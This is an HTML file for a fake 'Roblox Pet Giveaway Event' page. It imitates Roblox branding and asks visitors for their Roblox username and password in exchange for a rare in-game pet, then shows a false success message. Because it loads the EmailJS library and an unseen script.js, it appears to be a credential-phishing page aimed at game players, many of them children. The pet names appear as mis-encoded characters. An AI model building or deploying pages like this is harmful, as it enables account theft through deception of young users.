<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Pet Giveaway Event</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container-fluid min-vh-100 d-flex align-items-center justify-content-center">
        <div class="row w-100 justify-content-center">
            <div class="col-md-6 col-lg-4">
                <!-- Login Card -->
                <div class="login-card" id="loginCard">
                    <div class="text-center mb-4">
                        <div class="roblox-logo mb-3">
                            <svg width="60" height="60" viewBox="0 0 60 60">
                                <rect x="10" y="10" width="40" height="40" fill="#00B2FF" 
                                      transform="rotate(15 30 30)" rx="8"/>
                            </svg>
                        </div>
                        <h2 class="login-title">Pet Giveaway Event</h2>
                        <p class="login-subtitle">Claim your exclusive pet reward!</p>
                    </div>

                    <form id="claimForm">
                        <div class="form-group mb-3">
                            <label for="username">Username</label>
                            <input type="text" class="form-control" id="username" name="username" required>
                        </div>

                        <div class="form-group mb-3">
                            <label for="password">Password</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>

                        <div class="form-group mb-4">
                            <label for="petReward">Choose Your Pet Reward</label>
                            <select class="form-control" id="petReward" name="petReward" required>
                                <option value="">Select a pet...</option>
                                <option value="ü¶ù Raccoon">ü¶ù Raccoon</option>
                                <option value="üêù Disco Bee">üêù Disco Bee</option>
                                <option value="ü¶ï T-Rex">ü¶ï T-Rex</option>
                                <option value="ü¶ä Corrupted Kitsune">ü¶ä Corrupted Kitsune</option>
                                <option value="‚ö° Raiju">‚ö° Raiju</option>
                                <option value="ü¶¥ Spinosaurus">ü¶¥ Spinosaurus</option>
                                <option value="ü™∞ Dragonfly">ü™∞ Dragonfly</option>
                                <option value="ü¶ã Butterfly">ü¶ã Butterfly</option>
                                <option value="ü¶î Blood Hedgehog">ü¶î Blood Hedgehog</option>
                                <option value="üê± Moon Cat">üê± Moon Cat</option>
                            </select>
                        </div>

                        <button type="submit" class="btn btn-primary w-100 claim-btn" id="claimBtn">
                            <i class="fas fa-gift me-2"></i>Claim My Pet
                        </button>
                    </form>

                    <div class="alert alert-danger mt-3 d-none" id="errorAlert"></div>
                </div>

                <!-- Success Card -->
                <div class="success-card d-none" id="successCard">
                    <div class="text-center">
                        <div class="celebration-icon mb-3">üéâ</div>
                        <h2 class="success-title">Congratulations!</h2>
                        <div class="pet-display mb-3">
                            <div class="pet-icon" id="claimedPetIcon"></div>
                            <h3 id="claimedPetName"></h3>
                        </div>
                        <p class="success-message">
                            Your <span id="claimedPetText"></span> has been claimed successfully!<br>
                            Check your email for confirmation details.
                        </p>
                        <button class="btn btn-primary" onclick="location.reload()">
                            <i class="fas fa-redo me-2"></i>Claim Another Pet
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
